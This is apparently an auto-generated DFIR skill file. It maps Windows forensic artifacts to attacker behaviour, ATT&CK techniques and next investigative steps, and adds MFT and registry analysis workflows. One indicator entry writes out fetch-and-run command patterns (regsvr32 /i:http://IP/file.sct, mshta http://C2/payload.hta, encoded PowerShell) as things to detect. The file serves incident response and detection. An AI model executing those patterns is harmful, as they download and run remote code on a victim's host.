---
name: forensic-artifacts
description: "Forensic artifact interpretation encyclopedia. Auto-generated from structured YAML."
version: 2.0.0
category: forensics
---

> **Auto-generated from structured YAML.** Source: `encyclopedia/entries/*.yaml`.

# Forensic Artifacts Encyclopedia

Maps common forensic artifacts to interpretation, attacker behavior, and MITRE ATT&CK techniques.

## How to Use

1. Identify the artifact type (Process, Network, Registry, Filesystem, MFT, Memory)
2. Jump to the corresponding section below
3. Match the observed artifact against the "What You See" column
4. Read the interpretation and ATT&CK mapping

## Coverage

| Category | Entries | Example Artifacts |
|---|---|---|
| **Process** | 9 | Process anomalies, masquerading, injection, parent-child relationships |
| **Network** | 5 | C2 beaconing, unusual ports, data exfiltration, lateral movement, DNS anomalies |
| **Registry** | 5 | Persistence mechanisms (Run keys, services, scheduled tasks), user activity, RDP history |
| **Filesystem** | 6 | ADS detection, timestomp, hidden files, web shells, Prefetch anomalies, browser download artifacts |
| **MFT** | 4 | SI/FN timestamp mismatch, resident data hiding, deleted file recovery, UsnJrnl anomalies |
| **Memory** | 4 | Injected code (RWX), unlinked DLLs, malware mutexes, process-network C2 correlation |

**Total: 33 entries across 6 categories.**

---

## Process Artifacts

### Process Hollowing Indicators

**What You See**: Process with VadS (shared memory) in VAD tree but different image on disk; CreateProcess(SUSPENDED) then NtUnmapViewOfSection then VirtualAllocEx then SetThreadContext then ResumeThread sequence

**Interpretation**: Process hollowing. Attacker starts legitimate process suspended, unmaps its code, injects malware, then resumes. The process appears legitimate in Task Manager but executes malicious code.

**MITRE ATT&CK**: T1055.012

**Confidence**: HIGH from VAD analysis; TENTATIVE from parent-child alone

**Next Step**: Extract injected memory region for analysis. Check network connections from the hollowed process.

### ImagePath Mismatch

**What You See**: Process name (lsass.exe) running from non-standard path (C:\Windows\Temp\lsass.exe instead of C:\Windows\System32\lsass.exe)

**Interpretation**: Process masquerading. Attacker placed malware named after a legitimate system binary in a writable directory to evade process-list inspection.

**MITRE ATT&CK**: T1036.005

**Confidence**: HIGH if path is writable by user; MEDIUM if system-owned alternate path

**Next Step**: Check parent process. If parent is not wininit.exe, confidence increases. Compare file hash against known-good.

### Injection via Thread Creation

**What You See**: CreateRemoteThread targeting a different process; thread start address in unbacked memory region

**Interpretation**: DLL injection or shellcode injection into a target process (typically explorer.exe, svchost.exe, or browser process).

**MITRE ATT&CK**: T1055.001, T1055

**Confidence**: HIGH if target is unexpected (e.g., notepad.exe receiving threads from word.exe)

**Next Step**: Analyze injected code region. Trace the injecting process.

### Suspicious Command-Line Arguments

**What You See**: cmd.exe /c piping to powershell -enc base64; rundll32.exe javascript: mshtml RunHTMLApplication; regsvr32.exe with /i:http://IP/file.sct scrobj.dll; mshta.exe http://C2/payload.hta

**Interpretation**: Living-off-the-land execution. Attacker uses signed Microsoft binaries to execute malicious code, bypassing application whitelisting.

**MITRE ATT&CK**: T1218, T1027, T1059.001

**Confidence**: HIGH for encoded base64; MEDIUM for complex but potentially legitimate args

**Next Step**: Decode base64 payload. Extract C2 URL from command line. Check parent process chain.

### Suspicious Parent-Child

**What You See**: cmd.exe spawned by winword.exe or excel.exe; powershell.exe spawned by w3wp.exe (IIS worker); svchost.exe with no parent

**Interpretation**: Office macro execution spawning shell (weaponized document). IIS spawning PowerShell (web shell). Orphaned svchost (process injection or parent killed).

**MITRE ATT&CK**: T1566.001, T1059.001, T1055

**Confidence**: HIGH for Office-to-shell chain; MEDIUM for web server-to-shell (consider legitimate admin scripts)

**Next Step**: Trace the document origin for Office macro. For web shell, check web server access logs for the request that spawned the shell.

### svchost.exe Running Outside services.exe

**What You See**: svchost.exe instance not parented by services.exe (PID ~500-700)

**Interpretation**: Malware masquerading as service host. Legitimate svchost.exe always has services.exe as parent.

**MITRE ATT&CK**: T1569.002, T1036.005

**Confidence**: HIGH. This is a definitive indicator.

**Next Step**: Check the binary path and hash. Legitimate svchost.exe from non-services parent is extremely rare.

### Typo-Squatted Process Name

**What You See**: Process name one character off from legitimate system binary: epxlorer.exe (vs explorer.exe), svhost.exe (vs svchost.exe), lsasss.exe (vs lsass.exe); character substitution (l-to-1, o-to-0, s-to-5)

**Interpretation**: Name-based process masquerading. Attacker named malware to resemble a legitimate process so it blends into Task Manager and process lists.

**MITRE ATT&CK**: T1036.005

**Confidence**: HIGH for single-char substitution of well-known system process name; HIGH if binary path is user-writable (Downloads, Temp, AppData); MEDIUM if binary is in System32 with suspicious name

**Next Step**: Cross-reference with filescan for full binary path. Check parent process. Compare binary hash against legitimate system binary. Check digital signature.

### Unsigned Process in System32

**What You See**: Executable in System32 or SysWOW64 without a valid digital signature from Microsoft

**Interpretation**: Malware planted in system directory to blend in. Legitimate Microsoft binaries are ALWAYS signed.

**MITRE ATT&CK**: T1036

**Confidence**: HIGH. Microsoft signs every binary in System32.

**Next Step**: Extract binary, submit hash to VirusTotal or internal threat intel.

### 32-bit Binary on 64-bit OS (Wow64)

**What You See**: Process has Wow64=True in volatility3 pslist output (or Image Type = x86 on 64-bit Windows)

**Interpretation**: 32-bit executable running via WoW64 subsystem on 64-bit OS. While many legitimate apps ship 32-bit, modern malware frequently uses 32-bit payloads for maximum compatibility.

**MITRE ATT&CK**: N/A

**Confidence**: LOW as standalone indicator; MEDIUM when combined with typo-squatted name or suspicious path

**Next Step**: Note in finding metadata. Alone it means nothing. Combined with name/path/parent anomalies, it strengthens the case.

---

## Network Artifacts

### Beaconing Pattern

**What You See**: Regular periodic connections to same external IP, every 30/60/300 seconds with consistent packet size

**Interpretation**: C2 beacon. Malware phoning home on a timer. Period and jitter profile can fingerprint the C2 framework (Cobalt Strike defaults to 60s with 0% jitter; Meterpreter uses 5s default).

**MITRE ATT&CK**: T1071.001, T1573

**Confidence**: HIGH if period is regular and destination has no business purpose; MEDIUM if could be update check

**Next Step**: Check process responsible (netscan then PID then pslist). Extract destination IP, check against threat intel.

### DNS Anomalies

**What You See**: DNS queries for unusually long subdomains (data.exfiltrated.here.attacker-c2.com); TXT record queries; high-frequency queries to same domain

**Interpretation**: DNS tunneling or DNS-based C2. Long subdomains encode exfiltrated data. TXT queries carry commands.

**MITRE ATT&CK**: T1071.004, T1048.003

**Confidence**: HIGH for subdomains over 50 chars or containing base64-like patterns

**Next Step**: Decode subdomain content. Check destination domain registration date.

### High-Volume Data Exfiltration

**What You See**: Large outbound transfer (100MB+) to single external IP over short period; or many small transfers totaling over 1GB over hours

**Interpretation**: Data exfiltration. Attacker staging and extracting collected data. Small-chunk exfil with delays is exfil over C2 channel. Single large transfer is likely separate mechanism.

**MITRE ATT&CK**: TA0010, T1041

**Confidence**: HIGH if destination is unknown IP and transfer coincides with access period; LOW if could be cloud backup

**Next Step**: Identify exfiltrated data type. Check destination IP reputation.

### Lateral Movement: SMB to Multiple Hosts

**What You See**: Process connecting to port 445 on multiple internal IPs in rapid succession

**Interpretation**: Lateral movement probing. Attacker scanning for open SMB shares or attempting PsExec/wmic remote execution.

**MITRE ATT&CK**: T1021.002, T1046

**Confidence**: HIGH from single source process touching 5+ internal hosts

**Next Step**: Identify source process. Check for successful authentications on target hosts.

### Unusual Outbound Port

**What You See**: Outbound connections on ports 4444, 8080, 8443, 53 (non-DNS), 443 (non-TLS handshake)

**Interpretation**: 4444 is Metasploit/Meterpreter default. 8080/8443 are common HTTP/S C2 alternatives. Port 53 non-DNS is DNS tunneling. Port 443 without TLS is raw TCP C2 through firewall-friendly port.

**MITRE ATT&CK**: T1572, T1571 (Non-Standard Port)

**Confidence**: MEDIUM. Port alone is not conclusive. Examine traffic content.

**Next Step**: Check process and traffic content. Correlate with process list and timeline.

---

## Registry Artifacts

### RDP Connection History

**What You See**: HKCU\Software\Microsoft\Terminal Server Client\Servers with external IPs; Default UserName hint

**Interpretation**: Outbound RDP connections from this host. External IPs suggest attacker used this host as jump box for lateral RDP.

**MITRE ATT&CK**: T1021.001

**Confidence**: HIGH. RDP client caches destination hostnames/IPs automatically.

**Next Step**: Check RDP connection timestamps against infection timeline. Investigate destination IPs.

### Persistence: Run Keys

**What You See**: Entries in HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, HKCU Run, or RunOnce pointing to suspicious paths (%APPDATA%, %TEMP%, C:\Users\Public)

**Interpretation**: Registry-based persistence. Malware will survive reboot because Windows auto-executes these keys at login.

**MITRE ATT&CK**: T1547.001

**Confidence**: HIGH for paths in user-writable temp directories; MEDIUM for unusual binary names in legitimate paths

**Next Step**: Extract the binary path and hash. Check file creation timestamp against infection timeline.

### Persistence: Scheduled Tasks

**What You See**: Scheduled task with trigger AtLogon or Daily executing from %APPDATA%\malware.exe; task named to blend in (GoogleUpdateTaskMachineUA, OneDrive Standalone Update)

**Interpretation**: Scheduled task persistence. Attacker uses common update task names to evade detection.

**MITRE ATT&CK**: T1053.005

**Confidence**: HIGH if binary path is user-writable; MEDIUM if path is unusual for the task name

**Next Step**: Check the task XML for full command line and triggers. Extract binary hash.

### Persistence: Services

**What You See**: New Windows service with Start = 2 (auto-start), ImagePath pointing to suspicious path, or service name mimicking legitimate service (WinDefend to WinDefender)

**Interpretation**: Service-based persistence. Service runs as SYSTEM on boot. Typo-squatting evades casual inspection.

**MITRE ATT&CK**: T1543.003

**Confidence**: HIGH for suspicious image paths; MEDIUM for typo-squat names (verify binary hash)

**Next Step**: Check the service binary hash and digital signature. Verify ImagePath points to expected location.

### User Activity: Typed URLs / Recent Files

**What You See**: NTUSER.DAT\Software\Microsoft\Internet Explorer\TypedURLs; RecentDocs key; Shellbags (USRCLASS.DAT ShellBags) showing folders the user browsed

**Interpretation**: User activity profiling. Shows what the user typed, opened, and browsed. Not malicious on its own but establishes user behavior baseline.

**MITRE ATT&CK**: N/A

**Confidence**: HIGH for shellbags and typed URLs (hard to forge); MEDIUM for RecentDocs (can be cleared)

**Next Step**: Correlate typed URLs with browser history. Shellbags reveal directory enumeration. Check for attacker staging directories.

---

## Filesystem Artifacts

### Alternate Data Streams (ADS)

**What You See**: NTFS ADS on file: file.txt:hidden.exe with executable content; ADS on directory

**Interpretation**: Data hiding. Attacker stored malware or data in ADS to evade directory listing (dir shows only primary stream). Common after dropper execution.

**MITRE ATT&CK**: T1564.004

**Confidence**: HIGH. ADS with executable content has no legitimate use on modern Windows.

**Next Step**: Extract ADS content. Check the hidden file hash against threat intel.

### Browser Download Artifacts

**What You See**: Files with .crdownload extension in user profile directories. Zone.Identifier alternate data stream on downloaded executables. Files in Downloads directory with ZoneId=3 in their ADS.

**Interpretation**: Browser-initiated download. .crdownload is Chromium temporary file extension during active downloads. Zone.Identifier:$DATA ADS contains the download source URL and security zone. Proves the file arrived via browser download, not USB or network share. ZoneId=3 means Internet Zone (untrusted source).

**MITRE ATT&CK**: T1566.001, T1204.002

**Confidence**: HIGH. .crdownload extension definitively proves browser download origin. Zone.Identifier ADS with ZoneId=3 proves the file came from the internet.

**Next Step**: Extract Zone.Identifier stream to recover download URL. Correlate download timestamp with browser history. Check email security gateway logs for same filename or URL.

### Hidden Files in System Directories

**What You See**: Files with ATTRIB +H (hidden) or +S (system) attributes in C:\Windows\Temp, C:\ProgramData, C:\Users\Public; files matching system file names but in wrong directories

**Interpretation**: Attacker hiding tools and staged data. System+hidden attributes make files invisible to default Explorer view.

**MITRE ATT&CK**: T1564.001

**Confidence**: HIGH for executables in Temp with system attributes; LOW for log/config files

**Next Step**: List all hidden+system files in user-writable directories. Check file hashes.

### Prefetch Anomalies

**What You See**: Prefetch file for CMD.EXE-hash.pf or POWERSHELL.EXE-hash.pf with run count = 1; prefetch for binary executed from %TEMP%

**Interpretation**: First-time execution of shell from unusual location. Prefetch records every process execution with run count and last-run time.

**MITRE ATT&CK**: T1059

**Confidence**: HIGH for shell binary from TEMP; MEDIUM for uncommon shell usage in general

**Next Step**: Check prefetch run count. Single execution is more suspicious than repeated use. Correlate with process creation timeline.

### Timestomp (Timestamp Tampering)

**What You See**: $STANDARD_INFORMATION timestamps differ from $FILE_NAME timestamps in MFT; file created/modified/accessed timestamps all identical to the second; timestamps predate OS install date

**Interpretation**: Timestomping. Attacker altered file timestamps to blend with system files or mislead timeline analysis. Identical timestamps indicate SetFileTime API was used.

**MITRE ATT&CK**: T1070.006

**Confidence**: HIGH for SI/FN mismatch; MEDIUM for identical timestamps (some installers do this legitimately)

**Next Step**: Check adjacent MFT entries for normal timestamp patterns. Compare file creation time with surrounding files.

### Web Shell Indicators

**What You See**: .asp, .aspx, .php files in web root (inetpub\wwwroot) with recent timestamps; web server process (w3wp.exe) spawning cmd.exe or powershell.exe

**Interpretation**: Web shell deployed. Attacker uploaded script-based shell through vulnerable web app. File access plus process creation chain confirms active use.

**MITRE ATT&CK**: T1505.003

**Confidence**: HIGH for script file plus process chain combination

**Next Step**: Analyze web shell code for capabilities. Check web server access logs for upload request.

---

## MFT Artifacts

### Deleted File Recovery Indicators

**What You See**: MFT record with IN_USE flag = 0 (free/available) but $DATA attribute still points to valid clusters; filename still readable

**Interpretation**: Recently deleted file. MFT record not yet reused. File content may still be recoverable if clusters have not been overwritten.

**MITRE ATT&CK**: T1070.004

**Confidence**: Recovery confidence depends on time since deletion and disk activity

**Next Step**: Attempt file recovery via icat or sleuthkit tools. Check UsnJrnl for deletion timestamp.

### MFT Resident Data Hiding

**What You See**: Small file (under 700 bytes) with data resident inside MFT record; MFT record shows $DATA attribute with Resident flag but file appears empty in Explorer

**Interpretation**: Data hidden in MFT slack. Attacker uses resident data attribute to store information inside the MFT itself, invisible to most forensic tools.

**MITRE ATT&CK**: T1564

**Confidence**: MEDIUM. Some legitimate tiny files are naturally resident. Check content.

**Next Step**: Extract and inspect resident data content. Check if content appears malicious.

### SI/FN Timestamp Mismatch

**What You See**: $STANDARD_INFORMATION (SI) timestamp differs from $FILE_NAME (FN) timestamp by over 1 hour; SI shows 2024 but FN shows 2023

**Interpretation**: Timestomp. $STANDARD_INFORMATION is user-modifiable via SetFileTime API. $FILE_NAME is kernel-maintained and only updated on file creation/move. The mismatch reveals the true creation window.

**MITRE ATT&CK**: T1070.006

**Confidence**: HIGH. SI/FN discrepancy over 24h is almost certainly tampering.

**Next Step**: Note the discrepancy window. This reveals the true creation/activity period.

### UsnJrnl Anomalies

**What You See**: High volume of USN_RECORD entries for single file (rename then delete then create then rename cycle); DELETE and CLOSE entries for security logs (Security.evtx)

**Interpretation**: File manipulation burst suggests anti-forensic activity. Security log deletion indicates attacker covering tracks. Rename cycles suggest file staging.

**MITRE ATT&CK**: T1070.001, T1070.004

**Confidence**: HIGH for security log deletion; MEDIUM for rename cycles (installers do this legitimately)

**Next Step**: Correlate with attacker activity window. Check which account performed the deletions.

---

## Memory Artifacts

### Injected Code Detection

**What You See**: Memory region with PAGE_EXECUTE_READWRITE (RWX) permissions; VAD tag not matching the backing file; MZ header at non-zero offset in a region

**Interpretation**: Code injection. RWX memory is required for dynamically-generated code. Unbacked executable memory with PE header indicates injected DLL or shellcode.

**MITRE ATT&CK**: T1055

**Confidence**: HIGH for RWX plus unbacked plus PE header combination

**Next Step**: Dump the injected memory region. Analyze the extracted PE file.

### Mutex Objects Indicating Malware

**What You See**: Named mutex matching known malware families: Global random guid, Local SM0 prefix, MicrosoftUpdate (Ursnif), _AVIRA_2109 (Emotet)

**Interpretation**: Malware infection marker. Many families create named mutexes for single-instance enforcement. The mutex name can fingerprint the family.

**MITRE ATT&CK**: N/A

**Confidence**: HIGH if mutex matches known IOC; LOW if generic name

**Next Step**: Search for mutex name in threat intel databases. Identify the malware family.

### Network Connections from Injected Process

**What You See**: netscan shows TCP connection from PID that also has injected memory regions (RWX, VAD anomaly)

**Interpretation**: Active C2 from injected process. The injection enabled network communication. PID on connection plus memory analysis on same PID equals correlated evidence.

**MITRE ATT&CK**: T1055, T1071

**Confidence**: HIGH. Correlation of memory artifact with network artifact is strong evidence.

**Next Step**: Trace the C2 connection. Extract IOC (IP, domain). Check process timeline for injection timing.

### Unlinked DLL

**What You See**: DLL loaded in process memory (InLoadOrderModuleList in PEB) but NOT listed in VAD tree; or vice versa

**Interpretation**: Hidden DLL. Attacker manually mapped DLL into process without using LoadLibrary, evading module-listing tools.

**MITRE ATT&CK**: T1055.001, T1574.002

**Confidence**: HIGH. Legitimate software uses LoadLibrary which updates both lists.

**Next Step**: Dump the hidden DLL for analysis. Check export table for suspicious function names.

---

## Cross-Reference: Finding to Next Steps

| Finding Type | Next Phase | Tool Source | Record As |
|---|---|---|---|
| Process anomaly | Phase 2: Deep-dive that PID | volatility3, MemProcFS | Finding with PID, path, parent PID |
| Typo-squatted name | Phase 2: Hash comparison, path check | volatility3, MemProcFS exe/ | Finding + IOC (binary hash, path) |
| Network beacon | Phase 2: Trace to process, extract IOCs | netscan, MemProcFS net/ | IOC (IP, domain, port) |
| Registry persistence | Phase 2: Trace binary, timeline entry | RegRipper via sift-exec.sh | Finding + IOC (registry key, binary hash) |
| Timestomp | Phase 2: File-system timeline | sleuthkit, plaso via sift-exec.sh | Finding + timeline event |
| Web shell | Phase 2: Log analysis, command timeline | sleuthkit fls | Finding + IOC (file path, hash) |
| Browser download | Phase 2: Extract Zone.Identifier, correlate email | sleuthkit icat, volatility3 filescan | Finding + IOC (download URL, sender domain) |
| Injected code | Phase 2: Extract and analyze payload | volatility3 malfind, MemProcFS VAD | Finding + IOC (mutex, C2 IP) |

## Pitfalls

1. **Artifact is not Malicious**: An unsigned binary in Temp folder could be a legitimate installer. Always correlate with parent process, network connections, and timeline context before calling it.

1. **SI/FN mismatch in virtualized apps**: Some application virtualization (App-V, ThinApp) legitimately touches timestamps. Confirm the mismatch aligns with attacker activity window.

1. **Memory-only artifacts are volatile**: Process injection evidence disappears on reboot. Capture memory dumps FIRST in any investigation sequence.

1. **Mutex names change between versions**: Rely on mutex patterns (guid-like, specific prefixes) rather than exact strings. Threat intel IOCs go stale within weeks.

1. **Port numbers are not definitive**: Port 4444 has legitimate uses (Kubernetes, some databases). Always check the actual traffic or process context.

---

## Appendix: MFT Analysis Workflow

# MFT Analysis

## When to Use
- Analyzing NTFS Master File Table ($MFT) from a disk image
- Timeline reconstruction from $STANDARD_INFORMATION and $FILE_NAME timestamps
- Detecting timestomping (SI vs FN timestamp mismatch)
- Finding Alternate Data Streams (ADS)

## Pre-flight
1. Read /home/niel/forensics/tools/tool-catalog.yaml — note: analyzeMFT primary, MFTECmd pending
2. Docker image: forensics-mft-tools:1.2.0.0

## Workflow

### Step 1: Parse MFT
```bash
docker run --rm \
  -v /home/niel/forensics/cases/CASE_ID/evidence:/evidence:ro \
  -v /home/niel/forensics/cases/CASE_ID/raw:/output \
  forensics-mft-tools:1.2.0.0 \
  python3 -m analyzemft -f /evidence/MFT_FILE -o /output/analyzemft.csv
```

### Step 2: Extract key columns
Focus on: Record Number, File Name, Parent Path, SI Modified, SI Accessed, SI Created, SI Entry Modified, FN Created, FN Modified, Is Directory, In Use

### Step 3: Detect timestomping
Compare SI (Standard Information) timestamps vs FN (File Name) timestamps. 
SI timestamps are trivially modified by attackers. FN timestamps are harder to forge.
Large discrepancies = possible timestomping.

### Step 4: Find suspicious files
- Executables in temp directories
- Files with future timestamps
- Files with timestamps before volume creation
- ADS entries (filename contains ":")
- Recently deleted files (In Use = False)

### Step 5: Create findings
For each suspicious file: record full path, SI/FN timestamps, flags, and interpretation.

## Cross-Validation
For critical MFT findings:
1. Cross-reference with event logs (Event ID 4688 for process creation)
2. Cross-reference with registry (UserAssist, RecentDocs, Shimcache)
3. When MFTECmd becomes available: run as secondary parser for comparison

## Pitfalls
- $MFT is often fragmented — verify the extracted MFT is complete
- $STANDARD_INFORMATION timestamps are unreliable (timestomping)
- Large MFTs (>100MB) consume significant memory in Docker
- analyzeMFT may not parse all $STANDARD_INFORMATION flags on Win11 24H2

---

## Appendix: Registry Analysis Workflow

# Registry Analysis

## When to Use
- Analyzing Windows registry hives (SYSTEM, SOFTWARE, SAM, NTUSER.DAT, USRCLASS.DAT)
- Detecting persistence mechanisms (Run keys, services, scheduled tasks)
- User activity analysis (UserAssist, RecentDocs, typed URLs)

## Pre-flight
1. Read /home/niel/forensics/tools/tool-catalog.yaml — RegRipper 3.0 via SIFT VM
2. Evidence must be registered in evidence.json

## Workflow

### Step 1: Run RegRipper against a hive
```bash
bash /home/niel/forensics/scripts/sift-exec.sh "rip -r /cases/CASE_ID/evidence/HIVE_FILE -a > /cases/CASE_ID/raw/regripper.txt"
```

### Step 2: Extract persistence mechanisms
Search output for:
- Run/RunOnce keys: `Software\Microsoft\Windows\CurrentVersion\Run`
- Services: `System\CurrentControlSet\Services`
- Scheduled tasks
- Winlogon/AppInit DLLs
- Browser helper objects

### Step 3: Extract user activity
Search output for:
- UserAssist (GUI program execution history)
- RecentDocs (recently opened files)
- TypedURLs (IE/Edge typed URLs)
- Shellbags (folder access history)

### Step 4: SAM/SECURITY hive analysis
- User accounts and groups (SAM)
- Password policy (SAM)
- Service accounts (SECURITY)

### Step 5: Create findings
For each persistence mechanism: record full key path, value data, tool output, and interpretation.

## Pitfalls
- RegRipper may report "Unknown type" for new Win11 value types
- Deleted registry keys not recoverable from hive alone (need transaction logs too)
- SYSTEM hive requires admin to extract from live system
- RegRipper Perl runtime — ensure SIFT VM has it installed
